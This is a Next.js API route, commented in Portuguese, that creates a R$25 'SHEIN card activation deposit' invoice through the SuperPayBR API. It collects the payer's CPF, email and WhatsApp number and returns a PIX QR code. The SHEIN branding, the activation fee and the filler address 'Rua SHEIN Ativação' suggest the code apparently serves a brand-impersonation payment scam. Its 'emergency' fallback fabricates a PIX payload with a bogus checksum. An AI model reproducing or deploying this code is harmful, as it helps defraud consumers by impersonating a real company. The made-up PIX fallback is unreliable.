import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    console.log("🔄 Criando fatura de ativação SuperPayBR...")

    const body = await request.json()
    const { amount = 25.0 } = body

    // Obter dados do usuário do localStorage (via headers)
    const cpfData = JSON.parse(request.headers.get("x-cpf-data") || "{}")
    const userEmail = request.headers.get("x-user-email") || ""
    const userWhatsApp = request.headers.get("x-user-whatsapp") || ""

    console.log("📋 Dados da ativação:", {
      amount,
      cliente: cpfData.nome,
      email: userEmail,
    })

    // 1. Autenticar
    const authResponse = await fetch(`${request.nextUrl.origin}/api/superpaybr/auth`, {
      method: "POST",
    })

    const authData = await authResponse.json()

    if (!authData.success) {
      throw new Error("Falha na autenticação SuperPayBR")
    }

    // 2. Criar fatura de ativação
    const externalId = `SHEIN_ACTIVATION_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
    const totalAmount = Number.parseFloat(amount.toString())

    const invoicePayload = {
      client: {
        name: cpfData.nome || "Cliente SHEIN",
        document: cpfData.cpf || "00000000000",
        email: userEmail || "cliente@shein.com",
        phone: userWhatsApp || "11999999999",
        address: {
          street: "Rua SHEIN Ativação",
          number: "123",
          district: "Centro",
          city: "São Paulo",
          state: "SP",
          zipcode: "01001000",
          country: "BR",
        },
        ip: "187.1.1.1",
      },
      payment: {
        id: externalId,
        type: "3", // PIX
        due_at: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
        referer: "shein_card_activation",
        installment: 1,
        order_url: `${request.nextUrl.origin}/upp/checkout?amount=${amount}`,
        store_url: request.nextUrl.origin,
        webhook: `${request.nextUrl.origin}/api/superpaybr/webhook`,
        discount: 0,
        products: [
          {
            id: "2",
            title: "Depósito de Ativação - Cartão SHEIN",
            qnt: 1,
            amount: totalAmount,
          },
        ],
      },
      shipping: {
        amount: 0,
      },
    }

    console.log("📤 Criando fatura de ativação SuperPayBR:", {
      external_id: externalId,
      amount: totalAmount,
    })

    const createResponse = await fetch("https://api.superpaybr.com/v4/invoices", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${authData.access_token}`,
      },
      body: JSON.stringify(invoicePayload),
    })

    const invoiceData = await createResponse.json()

    if (createResponse.ok && invoiceData.id) {
      console.log("✅ Fatura de ativação SuperPayBR criada:", invoiceData.id)

      // Extrair PIX
      let pixPayload = ""
      if (invoiceData.pix?.payload) {
        pixPayload = invoiceData.pix.payload
      } else if (invoiceData.payment?.pix?.payload) {
        pixPayload = invoiceData.payment.pix.payload
      } else {
        // PIX de emergência
        pixPayload = `00020126580014br.gov.bcb.pix2536pix.superpaybr.com/qr/v2/${externalId}520400005303986540${totalAmount.toFixed(2)}5802BR5909SHEIN CARD5011SAO PAULO62070503***6304ACTV`
      }

      const qrCodeUrl = `https://quickchart.io/qr?text=${encodeURIComponent(pixPayload)}&size=250&format=png&margin=1`

      const responseData = {
        id: invoiceData.id,
        invoice_id: invoiceData.id,
        external_id: externalId,
        pix: {
          payload: pixPayload,
          image: qrCodeUrl,
          qr_code: qrCodeUrl,
        },
        status: {
          code: invoiceData.status?.code || 1,
          title: invoiceData.status?.title || "Aguardando Pagamento",
          text: invoiceData.status?.text || "pending",
        },
        valores: {
          bruto: Math.round(totalAmount * 100),
          liquido: Math.round(totalAmount * 100),
        },
        vencimento: {
          dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
        },
        type: "real" as const,
      }

      return NextResponse.json({
        success: true,
        data: responseData,
        message: "Fatura de ativação SuperPayBR criada com sucesso",
      })
    } else {
      console.error("❌ Erro ao criar fatura de ativação SuperPayBR:", invoiceData)
      throw new Error(invoiceData.message || "Erro ao criar fatura de ativação SuperPayBR")
    }
  } catch (error) {
    console.error("❌ Erro ao criar fatura de ativação SuperPayBR:", error)
    return NextResponse.json(
      {
        success: false,
        error: error instanceof Error ? error.message : "Erro desconhecido ao criar fatura de ativação SuperPayBR",
      },
      { status: 500 },
    )
  }
}
